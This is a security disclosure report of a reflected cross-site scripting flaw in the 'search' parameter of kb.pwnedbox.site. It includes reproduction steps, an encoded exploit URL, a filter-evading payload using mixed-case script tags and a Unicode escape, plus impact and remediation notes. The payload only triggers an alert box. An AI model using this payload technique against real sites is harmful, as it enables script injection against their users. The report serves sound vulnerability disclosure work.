## Title
Reflected XSS - kb.pwnedbox.site

## Description
The `search` GET parameter on `kb.pwnedbox.site` was found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted JavaScript payload using the Unicode escape sequence `\u0061` successfully triggered an `alert(1)` dialog in the browser.

## Steps to Reproduce

1. Open the target website:
   ```text
   https://kb.pwnedbox.site/
   ```

2. Open the following crafted URL in a browser:
   ```text
   https://kb.pwnedbox.site/?search=hakama%27%22%3E%3CScriPt%3E%5Cu0061lert%281%29%3C%2FScriPt%3E
   ```

3. Allow the page to load.

4. Observe the JavaScript alert dialog displaying `1`, confirming successful JavaScript execution.

5. Dismiss the alert dialog.

## POC (Proof of Concept)

**Target URL:**  
https://kb.pwnedbox.site/

**HTTP Method:** GET

**Vulnerable Parameter:** `search`

**Payload:**
```html
hakama'"<><ScriPt>\u0061lert(1)</ScriPt>
```

**Crafted Request URL:**
```text
https://kb.pwnedbox.site/?search=hakama%27%22%3E%3CScriPt%3E%5Cu0061lert%281%29%3C%2FScriPt%3E
```

**Observed Result:**

The crafted JavaScript payload was successfully executed through the `search` parameter. The browser displayed an alert dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

**Screenshot:**

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/473234db-0368-41ed-819a-d05a7707b03d" />

<img width="1920" height="1200" alt="image" src="https://github.com/user-attachments/assets/21ed3ad3-30cd-45b9-97f1-6f09abd4c075" />

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `search` parameter before rendering its value in HTML.
- Validate and sanitize user-controlled input to prevent HTML and JavaScript injection.
- Implement a restrictive Content Security Policy (CSP) to block unauthorized inline JavaScript execution.
